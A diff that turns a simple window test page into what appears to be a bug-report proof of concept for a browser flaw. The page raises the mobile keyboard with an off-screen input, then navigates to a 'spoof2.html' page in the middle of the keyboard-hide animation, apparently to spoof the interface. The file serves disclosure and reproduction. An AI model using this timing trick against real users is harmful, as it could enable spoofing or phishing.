@@ -1,19 +1,100 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Open & Close Window</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Issue 553408030 - simplified repro (2 taps)</title>
+<style>
+  html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #fff; }
+
+  /* Off-screen input: focusing it raises the IME while the field itself is
+     invisible. No autofill / saved credentials needed - any input works.
+     Keep it top:-200px so the FillUi / IME anchor is out of bounds too. */
+  #field {
+    position: fixed;
+    top: -200px;
+    left: 0;
+    width: 300px;
+    height: 40px;
+    font-size: 16px;
+  }
+
+  .btn {
+    position: fixed;
+    left: 20px; right: 20px;
+    padding: 26px;
+    background: #1a73e8;
+    color: #fff;
+    font: 18px sans-serif;
+    text-align: center;
+    border-radius: 6px;
+    user-select: none;
+    -webkit-user-select: none;
+  }
+
+  #step1 { top: 38%; }
+  #step2 { bottom: 12%; background: #333; }
+
+  #status {
+    position: fixed;
+    top: 8px; left: 12px; right: 12px;
+    font: 12px monospace;
+    color: #555;
+    white-space: pre-wrap;
+  }
+</style>
 </head>
 <body>
-  <button onclick="openAndClose()">Open Window</button>
+<input id="field" type="text" autocomplete="off">
 
-  <script>
-    function openAndClose() {
-      var x = window.open('https://digital-credentials.dev/');
-      setTimeout(function() {
-        x.close();
-      }, 5000);
-    }
-  </script>
+<div id="status">waiting for step 1...</div>
+<div id="step1" class="btn">1. Tap here (opens keyboard)</div>
+<div id="step2" class="btn" hidden>2. Tap here (closes keyboard)</div>
+
+<script>
+const field  = document.getElementById('field');
+const step1  = document.getElementById('step1');
+const step2  = document.getElementById('step2');
+const status = document.getElementById('status');
+const log = m => status.textContent = m;
+
+let imeShown = false;
+let baseline = 0;
+
+// Track IME visibility through visualViewport instead of fixed timers.
+// Keyboard up   => viewport height shrinks sharply
+// Keyboard down => viewport height grows back  => navigate INSIDE the
+//                  hide-animation window (this is the fragile timing the
+//                  original PoC fakes with a 6s setTimeout)
+function onVpChange() {
+  const h = Math.round(visualViewport.height);
+  if (!baseline) baseline = window.innerHeight;
+  if (h < baseline * 0.75) {
+    if (!imeShown) { imeShown = true; log('IME shown (vp=' + h + ') - now do step 2'); }
+  } else if (imeShown) {
+    log('IME hiding (vp=' + h + ') - navigating mid-animation...');
+    location.replace('spoof2.html');
+  }
+}
+
+if (window.visualViewport) {
+  visualViewport.addEventListener('resize', onVpChange);
+  visualViewport.addEventListener('scroll', onVpChange);
+} else {
+  log('no visualViewport API');
+}
+
+step1.addEventListener('click', () => {
+  field.focus({ preventScroll: true });
+  step1.hidden = true;
+  step2.hidden = false;
+  log('field focused off-screen, waiting for IME...');
+});
+
+step2.addEventListener('click', () => {
+  field.blur();          // starts the IME hide animation; resize handler navigates
+  log('blur - keyboard should hide now');
+});
+</script>
 </body>
 </html>
